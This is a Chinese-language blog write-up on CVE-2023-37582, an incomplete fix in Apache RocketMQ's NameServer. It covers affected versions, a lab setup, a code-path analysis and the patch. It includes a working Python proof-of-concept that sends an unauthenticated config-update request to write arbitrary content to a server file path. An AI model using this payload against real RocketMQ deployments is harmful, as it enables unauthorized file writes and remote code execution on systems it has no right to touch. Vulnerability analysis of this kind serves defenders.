# Apache RocketMQ 远程代码执行漏洞（CVE-2023-37582） - 合天网安实验室 - 博客园

> 原文：[`www.cnblogs.com/hetianlab/p/17594392.html`](https://www.cnblogs.com/hetianlab/p/17594392.html)

![image](img/76eed303f5f09ecfb548fdd31d40d5e5.png)​

## 漏洞简介

Apache RocketMQ 是一款低延迟、高并发、高可用、高可靠的分布式消息中间件。CVE-2023-37582 中，由于对 CVE-2023-33246 修复不完善，导致在 Apache RocketMQ NameServer 存在未授权访问的情况下，攻击者可构造恶意请求以 RocketMQ 运行的系统用户身份执行命令。

影响版本

Apache RocketMQ <= 5.1.1 Apache RocketMQ <= 4.9.6

## 环境搭建

参考 Apache RocketMQ 远程代码执行漏洞 CVE-2023-33246 的环境搭建

还是为了方便进行调试，我们再 linux 下搭建 RocketMQ 的相关服务，利用源码启动

一共需要运行两个服务

```
org.apache.rocketmq.namesrv.NamesrvStartup
org.apache.rocketmq.broker.BrokerStartup
```

先启动 NamesrvStartup，再启动 BrokerStartup 同时都需要配置环境变量 ROCKETMQ_HOME ROCKETMQ_HOME\=/home/ubuntu/Desktop/rocketmq-rocketmq-all-5.1.0

![image](img/6f1b562df6f3d4ac72fe17f983f47a34.png)​

![image](img/eef5ff9f17d1561c22f4826bd5a2eb01.png)​

## 漏洞复现

运行 python 脚本

```
import socket
import binascii
client = socket.socket()
​
# you ip
client.connect(('192.168.222.130',9876))
​
# data
json = '{"code":318,"flag":0,"language":"JAVA","opaque":266,"serializeTypeCurrentRPC":"JSON","version":433}'.encode('utf-8')
body='configStorePath=/tmp/test.txt\nproductEnvName=123\\ntest'.encode('utf-8')
json_lens = int(len(binascii.hexlify(json).decode('utf-8'))/2) # 一个字节是 2 个十六进制数
head1 = '00000000'+str(hex(json_lens))[2:]      # hex(xxxx) 0x1243434 去掉 0x
all_lens = int(4+len(binascii.hexlify(body).decode('utf-8'))/2+json_lens)
head2 = '00000000'+str(hex(all_lens))[2:]
data = head2[-8:]+head1[-8:]+binascii.hexlify(json).decode('utf-8')+binascii.hexlify(body).decode('utf-8')
​
# send
client.send(bytes.fromhex(data))
data_recv = client.recv(1024)
print(data_recv)
```

![image](img/5fa206c9c04e1a0b0a6be551cc99b726.png)​

![image](img/0325858b3feb8666bb3681e63e16cc69.png)

成功在 tmp 目录下的 test.txt 文件中写入指定字符串 test

【----帮助网安学习，以下所有学习资料免费领！加 vx：yj009991，备注 “博客园” 获取！】

　① 网安学习成长路径思维导图
　② 60+网安经典常用工具包
　③ 100+SRC 漏洞分析报告
　④ 150+网安攻防实战技术电子书
　⑤ 最权威 CISSP 认证考试指南+题库
　⑥ 超 1800 页 CTF 实战技巧手册
　⑦ 最新网安大厂面试题合集（含答案）
　⑧ APP 客户端安全检测指南（安卓+IOS）

## 漏洞分析

`org/apache/rocketmq/remoting/protocol/RequestCode.java`​ code 代表调用不同的功能，此时调用的是 318 更新配置的操作

`src/main/java/org/apache/rocketmq/remoting/protocol/RequestCode.java`​

![image](img/16fe7f23fb4713f9967a85b9fee0da13.png)

根据对应的 code 会调用 对应的函数进行处理

`src/main/java/org/apache/rocketmq/namesrv/processor/DefaultRequestProcessor.java`​

![image](img/a042b1a258f917131557b980ec5ae20a.png)​

`src/main/java/org/apache/rocketmq/namesrv/processor/DefaultRequestProcessor.java#updateConfig`​

![image](img/d5e0d4c91edf94c8d20ff4acb2aec63e.png)​​`src/main/java/org/apache/rocketmq/remoting/Configuration.java#update`​

![image](img/f6420b71f42141309b5af9c9f1d43362.png)​​

首先判断是不是属于可控的属性

`src/main/java/org/apache/rocketmq/remoting/Configuration.java#persist`​

![image](img/86055737ce1bd888ff3ec41a18a99bcc.png)​`src/main/java/org/apache/rocketmq/remoting/Configuration.java#getStorePath`​

![image](img/90608deecee836ff10003951e14d9783.png)

调用 `getStorePath`​ 获取文件路径，此时获取的值是 configStorePath 的值

`src/main/java/org/apache/rocketmq/common/MixAll.java#string2File`​

![image](img/7afd1b7bd50d43462787e9abb568d054.png)​​`src/main/java/org/apache/rocketmq/common/MixAll.java#string2FileNotSafe`​

![image](img/bbdeeb117dea8e70ae86d2b097cae462.png)​​`src/main/java/org/apache/rocketmq/common/utils/IOTinyUtils.java#writeStringToFile`​

![image](img/e3f7a7cb5518c186cfebdfb606573c84.png)​

## 漏洞修复

修改禁用修改配置路径的参数

![image](img/9476dea7bbe2ef471e3b5334ec34d60e.png)

**更多网安技能的在线实操练习，[请点击这里>>](https://www.hetianlab.com/)**

​